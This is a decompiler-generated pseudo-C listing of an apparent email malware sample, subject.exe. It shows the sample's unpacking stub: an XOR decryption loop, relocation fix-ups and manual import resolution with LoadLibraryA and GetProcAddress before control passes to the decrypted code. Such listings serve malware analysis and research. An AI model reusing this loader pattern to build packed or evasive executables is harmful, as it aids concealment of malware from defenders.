// subject.c
// Generated on 5/4/2015 12:23:05 AM by decompiling malware_via_email/malware_0102/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(word32 ecx, word32 edx, word32 ebx, word32 edi)
{
fn00401000_entry:
l00401000:
	word32 eax_28 = AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000)
	word32 esi_15 = 0x00000000
	word32 ebx_276 = eax_28 + 0x00000016
	branch AreAnyAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l00401030
l0040102D:
	ebx_276 = eax_28 - 0x0000000C
l00401030:
	word32 eax_48 = 0x00000000
l00401035:
	branch esi_15 != ebx_276 l0040103E
l0040103C:
	esi_15 = 0x00000000
l0040103E:
	byte v15_68 = Mem0[eax_48 + 0x00401190:byte] ^ Mem0[esi_15 + 0x00404000:byte]
	Mem69[eax_48 + 0x00401190:byte] = v15_68
	eax_48 = eax_48 + 0x00000001
	esi_15 = esi_15 + 0x00000001
	branch eax_48 <u 0x00001440 l00401035
l0040105A:
	word32 ecx_115 = 0x00402490
	word32 dwLoc08_119 = 0x00000000
l00401080:
	word32 eax_93 = Mem69[ecx_115 + 0x00000004:word32]
	word32 edx_100 = ecx_115 + 0x00000008
	branch eax_93 - 0x00000008 >>u 0x00000001 <= 0x00000000 l004010BA
l00401092:
	word32 esi_253 = eax_93 - 0x00000008 >>u 0x00000001
l00401094:
	word32 eax_256 = (word32) Mem69[edx_100 + 0x00000000:word16]
	branch (eax_256 & 0x0000F000) != 0x00003000 l004010B2
l004010A7:
	word32 eax_268 = (eax_256 & 0x00000FFF) + Mem69[ecx_115 + 0x00000000:word32]
	Mem271[eax_268 + 0x00400F10:word32] = Mem69[eax_268 + 0x00400F10:word32] + 0xF0400F10
l004010B2:
	edx_100 = edx_100 + 0x00000002
	esi_253 = esi_253 - 0x00000001
	branch esi_253 != 0x00000000 l00401094
l004010BA:
	word32 eax_105 = Mem69[ecx_115 + 0x00000004:word32]
	word32 edx_107 = dwLoc08_119 + eax_105
	word32 ecx_108 = ecx_115 + eax_105
	branch edx_107 <u 0x000000E4 l00401080
	word32 eax_112 = Mem69[ecx_108 + 0x00000004:word32]
	word32 edx_114 = edx_107 + eax_112
	ecx_115 = ecx_108 + eax_112
	dwLoc08_119 = edx_114
	branch edx_114 <u 0x000000E4 l00401080
l004010D1:
	branch Mem69[0x00401C94:word32] == 0x00000000 l00401154
	word32 esi_125 = 0x00401C84
	word32 dwLoc08_126 = 0x00401C84
	esi_155 = esi_125
	branch Mem69[0x00401C94:word32] == 0x00000000 l00401154
l004010E4:
	word32 esi_155
	branch LoadLibraryA(Mem69[esi_155 + 0x0000000C:word32] + 0x00400F10) == 0x00000000 l00401147
	word32 eax_172 = LoadLibraryA(Mem69[esi_155 + 0x0000000C:word32] + 0x00400F10)
	word32 edx_174 = eax_172
	branch eax_172 == 0x00000000 l00401147
l004010FD:
	branch Mem69[esi_155 + 0x00000000:word32] != 0x00000000 l00401106
	word32 ebx_202 = Mem69[esi_155 + 0x00000000:word32]
	branch ebx_202 != 0x00000000 l00401106
l00401103:
	ebx_202 = Mem69[esi_155 + 0x00000010:word32]
l00401106:
	word32 ebx_208 = ebx_202 + 0x00400F10
	word32 edi_209 = Mem69[esi_155 + 0x00000010:word32] + 0x00400F10
	branch Mem69[ebx_208 + 0x00000000:word32] == 0x00000000 l00401147
l00401112:
	goto l00401118
l00401114:
	edx_174 = eax_172
l00401118:
	word32 dwLoc1C_231
	word32 eax_224 = Mem69[ebx_208 + 0x00000000:word32]
	word16 ax_225 = (word16) eax_224
	branch eax_224 >= 0x00000000 l00401127
l00401121:
	dwLoc1C_231 = (word32) ax_225
	goto l0040112C
l00401127:
	dwLoc1C_231 = eax_224 + 0x00400F12
l0040112C:
	Mem236[edi_209 + 0x00000000:word32] = GetProcAddress(edx_174, dwLoc1C_231)
	ebx_208 = ebx_208 + 0x00000004
	edi_209 = edi_209 + 0x00000004
	branch Mem236[ebx_208 + 0x00000000:word32] != 0x00000000 l00401114
l00401143:
	esi_155 = dwLoc08_126
l00401147:
	esi_155 = esi_155 + 0x00000014
	dwLoc08_126 = esi_155
	branch Mem69[esi_155 + 0x00000010:word32] != 0x00000000 l004010E4
l00401154:
	call 0x00401960 (retsize: 4; depth: 28)
	ExitProcess(0x00000000)
	int3()
fn00401000_exit:
}

